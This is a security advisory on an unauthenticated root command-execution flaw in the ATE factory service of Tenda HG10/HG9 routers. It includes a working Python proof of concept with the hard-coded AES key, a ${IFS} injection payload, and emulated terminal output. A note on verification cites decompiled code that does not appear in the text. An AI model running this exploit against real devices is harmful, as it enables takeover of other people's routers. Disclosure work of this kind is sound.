# Tenda HG10/HG9 V3.3.0-250113 was discovered to contain an unauthenticated ATE command execution vulnerability

## Overview

- Vendor: Tenda
- Product: HG10/HG9 (HG7_HG9_HG10 family)
- Version: V3.3.0-250113
- Component: /bin/ate via unauthenticated GET /goform/ate; UDP 7329
- Vulnerability Class: CWE-306 missing authentication / CWE-78 command injection / CWE-798 hard-coded key
- Manufacturer: https://www.tendacn.com/

## Affected version

- Package `HG7_HG9_HG10re_300001138.zip`.
- `boa`.
- `/bin/ate`.

## Vulnerability details

`process_header_end` treats `/goform/ate` as a pre-auth path and starts the ATE
factory service. ATE listens on UDP 7329 and accepts AES-128-CBC messages with
the hard-coded key `Tenda0123456789M` and a zero IV. The `generic_ate` command
passes its arguments to `system`/`popen` and returns stdout. The `start_effect`
path also uses attacker-controlled filenames and a tftp server in shell
commands.

## PoC

```python
import socket
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

KEY = b"Tenda0123456789M"
IV = b"\0" * 16

def enc(data):
    data = data.ljust(((len(data) + 15) // 16) * 16, b"\0")
    e = Cipher(algorithms.AES(KEY), modes.CBC(IV)).encryptor()
    return e.update(data) + e.finalize()

def dec(data):
    d = Cipher(algorithms.AES(KEY), modes.CBC(IV)).decryptor()
    return d.update(data) + d.finalize()

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
s.settimeout(6)
s.sendto(enc(b"generic_ate ls${IFS}/"), ("255.255.255.255", 7329))
print(dec(s.recvfrom(4096)[0]))
```

## Reproduction and terminal evidence

Environment: qemu-user HG10/HG9 rootfs. The stock Boa `process_header_end`
pre-auth branch is used; only the `>/dev/null` redirection was made writable
in the test chroot to observe the startup line. ATE, AES and `system` are the
vendor binaries.

Terminal transcript:

```
$ curl --http0.9 -sS http://127.0.0.1/goform/ate
load mfg success
$ python3 -I poc_ate_generic.py 255.255.255.255 'generic_ate ls${IFS}/'
generic_ate ls${IFS}/ -> b'bin\ndev\netc\nfirmadyne\n...\nweb_home\n'
$ python3 -I poc_ate_generic.py 255.255.255.255 'generic_ate echo${IFS}GEN_PWN'
generic_ate echo${IFS}GEN_PWN -> b'GEN_PWN\n'
```

`${IFS}` is used instead of a literal space because the ATE parser splits on
spaces before invoking the shell.

## Verification

The vulnerable handler in the stock `/bin/ate via unauthenticated GET /goform/ate; UDP 7329` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

Unauthenticated attacker on the LAN can execute arbitrary commands as root
through UDP 7329 after a single unauthenticated HTTP request. The same
service supports factory commands that can alter or reboot the device.

## Remediation

- Do not start ATE from an unauthenticated HTTP request; require an admin
  session or a physical factory-reset gesture.
- Remove `generic_ate` or restrict it to a fixed command allow-list.
- Do not hard-code the AES key; use a per-device secret.
- Replace `system`/`popen` string concatenation with `execve`/argv.

## Known CVE relation

**CVE candidate type: new affected model (HG10/HG9 2025) for the ATE command-execution class — candidate new CVE.**

- CVE-2023-2649, CVE-2024-48825/48826, CVE-2024-9793, CVE-2025-15254 and
  CVE-2026-19747 cover ATE issues in other Tenda models. NVD keywords
  `Tenda HG10 ATE`, `generic_ate`, `start_effect` return 0 records
  (2026-11-06).

## Status and disclosure

Dynamic confirmation (qemu-user). Candidate new CVE — new affected model (HG10/HG9 2025) for the ATE command-execution class; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
HG10/HG9 (HG7_HG9_HG10 family)

### Version or Commit
V3.3.0-250113

### Vulnerability Class
CWE-306 missing authentication / CWE-78 command injection / CWE-798 hard-coded key

### CVE_candidate_type
new affected model (HG10/HG9 2025) for the ATE command-execution class — candidate new CVE

### Description
process_header_end treats /goform/ate as pre-auth and starts the ATE service on UDP 7329. ATE accepts AES-128-CBC messages with the hard-coded key Tenda0123456789M and a zero IV, and generic_ate executes attacker-supplied commands.

### Affected_component
/bin/ate via unauthenticated GET /goform/ate; UDP 7329

### Attack_vector
Unauthenticated GET /goform/ate to start ATE, then an AES-encrypted generic_ate packet to UDP 7329.

### Product_version
HG10/HG9 (HG7_HG9_HG10 family) V3.3.0-250113

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/HG10_HG9_V3.3.0-250113/report-1.md
```
